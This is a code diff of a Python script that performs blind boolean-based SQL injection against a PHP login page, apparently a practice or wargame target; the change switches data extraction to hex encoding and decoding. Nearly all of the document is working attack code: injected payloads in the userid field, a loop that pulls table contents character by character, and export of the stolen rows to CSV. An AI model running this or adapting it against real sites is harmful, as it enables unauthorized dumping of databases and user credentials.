@@ -1,6 +1,8 @@
+import sys
 import requests
 import pandas
 from tkinter import messagebox
+import codecs
 
 #url = 'https://webhacking.kr/challenge/bonus-1/index.php'
 url = 'http://104.197.42.200/member/login_ok.php'
@@ -119,45 +121,63 @@ def find_column_name(table_name):
     return columnList
 
 def dump_data(table_name, column_list):
-	result = ''
-	size = 0
-	count = count_data(table_name)
-	dict = {}
-	for column_name in column_list:
-		list = []
-		for size in range(count):
-			i = 1
-			flag = True
-			while flag:
-				for key in keyword:
-					value = "' or 1=1 and binary(substring((select {} from {} limit {},1),{},1))='{}'#".format(column_name, table_name, size, i, key)
-					params = {'userid': value, 'userpw': 'test'}
-					response = requests.post(url,data=params, cookies=cookies)
-					#print(response.content)
-					print(value)
-					if check in response.text.encode('utf-8'):
-						result += key
-						i += 1
-						break
-					
-					if i == 1 and key == '0':
-						list.append('NULL')
-						flag = False
-						break
-					if key == '0':
-						list.append(result)
-						result = ''
-						i = 1
-						flag = False
-		dict[column_name] = list
-		print(list)
-	print(dict)
-	dataFrame = pandas.DataFrame(dict)
-	dataFrame.to_csv('{}.csv'.format(table_name))
-	return dict
+    result = ''
+    size = 0
+    count = count_data(table_name)
+    dict = {}
+    
+    for column_name in column_list:
+        list = []
+        for size in range(count):
+            i = 1
+            flag = True
+            while flag:
+                for key in keyword:
+                    value = "' or 1=1 and substring(hex((select {} from {} limit {},1)),{},1)='{}'#".format(column_name, table_name, size, i, key)
+                    params = {'userid': value, 'userpw': 'test'}
+                    response = requests.post(url,data=params, cookies=cookies)
+                    print(value)
+                    if check in response.text.encode('utf-8'):
+                        result += key
+                        print(result)
+                        i += 1
+                        break
+                    if i == 1 and key == '0':
+                        list.append('NULL')
+                        flag = False
+                        break
+                    if key == '0':
+                        var = bytes.fromhex(result).decode('utf-8')
+                        print(var)
+                        list.append(var)
+                        result = ''
+                        i = 1
+                        flag = False
+        dict[column_name] = list
+        print(list)
+    print(dict)
+    dataFrame = pandas.DataFrame(dict)
+    dataFrame.to_csv('{}.csv'.format(table_name))
+    return dict
 
 
 #print(find_db_name())
 #print(find_table_name('kShield_db'))
 #print(find_column_name('center'))
-print(dump_data('center', ['num', 'id', 'nick', 'subject', 'content', 'date', 'hit', 'filename']))
+print(dump_data('center', ['id']))
+# test = 'test_nick'
+# print(test)
+# test1 = test.encode('utf-8').hex()
+# print(test1)
+# print(bytes.fromhex(test1).decode('utf-8'))
+#print(codecs.decode('c3acc2a0c593c3abc2aac2a9', "hex").decode('EUC-KR', 'ignore'))
+# i = 0
+# while 1:
+#     value = "' or 1=1 and length(substring((select {} from {} limit {},1),{},2))='{}'#".format('content', 'center', 0, 1, i)
+#     params = {'userid': value, 'userpw': 'test'}
+#     response = requests.post(url,data=params, cookies=cookies)
+#     print(value)
+#     if check in response.text.encode('utf-8'):
+#         break
+#     else:
+#         i+=1
